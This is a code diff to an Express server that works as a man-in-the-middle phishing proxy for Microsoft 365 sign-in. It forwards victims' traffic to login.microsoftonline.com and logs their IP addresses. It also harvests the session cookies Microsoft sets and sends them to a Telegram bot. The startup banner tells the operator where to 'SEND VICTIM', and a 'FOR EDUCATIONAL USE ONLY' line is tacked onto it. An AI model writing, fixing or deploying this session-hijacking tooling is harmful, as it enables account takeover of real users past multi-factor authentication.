@@ -148,11 +148,12 @@ function extractOfficeCookies(cookies) {
 }
 
 // =============================================
-// ✅ FIXED: PROXY MIDDLEWARE - CORRECT TARGET
+// ✅ FIXED: PROXY - CORRECT MICROSOFT LOGIN URL
 // =============================================
+const MICROSOFT_LOGIN_URL = 'https://login.microsoftonline.com/common/oauth2/v2.0/authorize';
+
 const proxyMiddleware = createProxyMiddleware({
-    // ✅ CORRECT: Send to the root of Microsoft login
-    target: 'https://login.microsoftonline.com',
+    target: MICROSOFT_LOGIN_URL,
     changeOrigin: true,
     secure: true,
     ws: true,
@@ -160,15 +161,28 @@ const proxyMiddleware = createProxyMiddleware({
         '*': ''
     },
     pathRewrite: {
-        '^/proxy': '/'  // ← THIS IS KEY! Removes /proxy from the path
+        '^/proxy': ''  // Remove /proxy from path
     },
     onProxyReq: (proxyReq, req, res) => {
         console.log('\n🎯 PROXY REQUEST RECEIVED');
         console.log('🌐 Original URL:', req.url);
         console.log('📌 Method:', req.method);
         
-        // Log the request being forwarded
-        console.log('📤 Forwarding to:', proxyReq.path);
+        // Add required query parameters to avoid the error
+        const queryParams = {
+            client_id: '1b730954-1685-4b74-9bfd-dac224a7b894',
+            redirect_uri: 'https://login.microsoftonline.com/common/oauth2/nativeclient',
+            response_type: 'code',
+            response_mode: 'query'
+        };
+        
+        // Add params if not already present
+        const hasParams = req.url.includes('?');
+        if (!hasParams) {
+            const params = new URLSearchParams(queryParams);
+            proxyReq.path = proxyReq.path + '?' + params.toString();
+            console.log('📤 Added OAuth parameters to request');
+        }
         
         const cookieHeader = proxyReq.getHeader('cookie') || req.headers.cookie || '';
         
@@ -239,7 +253,6 @@ const proxyMiddleware = createProxyMiddleware({
             console.log('\n🍪 MICROSOFT SET COOKIES:');
             console.log(setCookie.join('\n'));
             
-            // Extract cookies from set-cookie
             const cookies = {};
             for (const cookie of setCookie) {
                 const [name, ...valueParts] = cookie.split('=');
@@ -248,7 +261,6 @@ const proxyMiddleware = createProxyMiddleware({
                 }
             }
             
-            // Send to Telegram
             const message = '🍪 <b>New Cookies from Microsoft!</b>\n\n' +
                 setCookie.map(c => `• ${c.substring(0, 100)}...`).join('\n');
             sendToTelegram(message).catch(console.error);
@@ -276,25 +288,28 @@ const proxyMiddleware = createProxyMiddleware({
 });
 
 // =============================================
-// ✅ FIXED: PROXY ROUTE - Handles all paths
+// PROXY ROUTE
 // =============================================
-// This catches /proxy, /proxy/, /proxy/anything
 app.use('/proxy', (req, res, next) => {
     console.log('\n🎯 PROXY ACCESS');
     console.log('📍 Client IP:', req.ip || req.connection.remoteAddress);
-    console.log('🌐 Full URL:', req.url);
-    console.log('🌐 Original URL:', req.originalUrl);
+    console.log('🌐 URL:', req.url);
     next();
 });
 
 app.use('/proxy', proxyMiddleware);
 
 // =============================================
-// Also handle /proxy/ (with trailing slash)
+// ✅ FIXED: Direct Microsoft Login Link (No Proxy)
 // =============================================
-app.get('/proxy/', (req, res) => {
-    // Redirect to /proxy (without slash) so it works properly
-    res.redirect('/proxy');
+app.get('/login', (req, res) => {
+    const loginUrl = 'https://login.microsoftonline.com/common/oauth2/v2.0/authorize?' +
+        'client_id=1b730954-1685-4b74-9bfd-dac224a7b894' +
+        '&redirect_uri=https://login.microsoftonline.com/common/oauth2/nativeclient' +
+        '&response_type=code' +
+        '&response_mode=query';
+    
+    res.redirect(loginUrl);
 });
 
 // =============================================
@@ -415,7 +430,7 @@ app.listen(PORT, () => {
 ║   📌 SEND VICTIM TO:                                       ║
 ║   🔗 https://your-railway-url/proxy                        ║
 ║                                                              ║
-║                                                              ║
+║   ⚠️  FOR EDUCATIONAL USE ONLY!                            ║
 ║                                                              ║
 ╚══════════════════════════════════════════════════════════════╝
     `);
